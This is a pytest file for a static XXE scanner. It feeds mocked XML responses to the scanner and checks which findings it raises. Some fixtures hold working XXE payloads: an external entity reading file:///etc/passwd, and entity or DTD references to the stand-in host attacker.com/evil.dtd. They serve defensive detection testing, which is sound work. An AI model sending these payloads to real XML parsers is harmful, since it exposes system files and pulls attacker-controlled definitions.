from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from cherenkov.core.base_scanner import Severity
from cherenkov.scanners.static_xxe_scanner import StaticXXEScanner


@pytest.mark.asyncio
async def test_static_xxe_detects_entity_reference():
    scanner = StaticXXEScanner()
    target = "http://example.com/data.xml"

    mock_response = AsyncMock()
    mock_response.status_code = 200
    mock_response.text = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<foo>&xxe;</foo>"
    )
    mock_response.headers = {"content-type": "application/xml"}

    with patch("httpx.AsyncClient.get", return_value=mock_response):
        result = await scanner.scan(target)

    assert result.target == target
    assert result.status == "completed"
    assert len(result.findings) >= 1
    assert any("XXE" in f.title for f in result.findings)
    assert any(f.severity == Severity.HIGH for f in result.findings)


@pytest.mark.asyncio
async def test_static_xxe_clean_html():
    scanner = StaticXXEScanner()
    target = "http://example.com/index.html"

    mock_response = AsyncMock()
    mock_response.status_code = 200
    mock_response.text = "<html><body>Hello</body></html>"
    mock_response.headers = {"content-type": "text/html"}

    with patch("httpx.AsyncClient.get", return_value=mock_response):
        result = await scanner.scan(target)

    assert result.status == "completed"
    assert len(result.findings) == 0


@pytest.mark.asyncio
async def test_static_xxe_detects_param_entity():
    scanner = StaticXXEScanner()
    target = "http://example.com/data.xml"

    mock_response = AsyncMock()
    mock_response.status_code = 200
    mock_response.text = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>'
        "<foo>test</foo>"
    )
    mock_response.headers = {"content-type": "application/xml"}

    with patch("httpx.AsyncClient.get", return_value=mock_response):
        result = await scanner.scan(target)

    assert result.status == "completed"
    assert len(result.findings) >= 1
    assert any("Parameter" in f.title for f in result.findings)


@pytest.mark.asyncio
async def test_static_xxe_detects_external_dtd():
    scanner = StaticXXEScanner()
    target = "http://example.com/data.xml"

    mock_response = AsyncMock()
    mock_response.status_code = 200
    mock_response.text = (
        '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo>test</foo>'
    )
    mock_response.headers = {"content-type": "text/xml"}

    with patch("httpx.AsyncClient.get", return_value=mock_response):
        result = await scanner.scan(target)

    assert result.status == "completed"
    assert len(result.findings) >= 1
    assert any("External DTD" in f.title for f in result.findings)


@pytest.mark.asyncio
async def test_static_xxe_request_timeout():
    scanner = StaticXXEScanner()
    target = "http://example.com/data.xml"

    class FailingClient:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *args):
            pass

        async def get(self, *args, **kwargs):
            import httpx

            raise httpx.TimeoutException("Timeout")

    with patch("httpx.AsyncClient", return_value=FailingClient()):
        result = await scanner.scan(target)

    assert result.status == "completed"
    assert len(result.findings) == 0
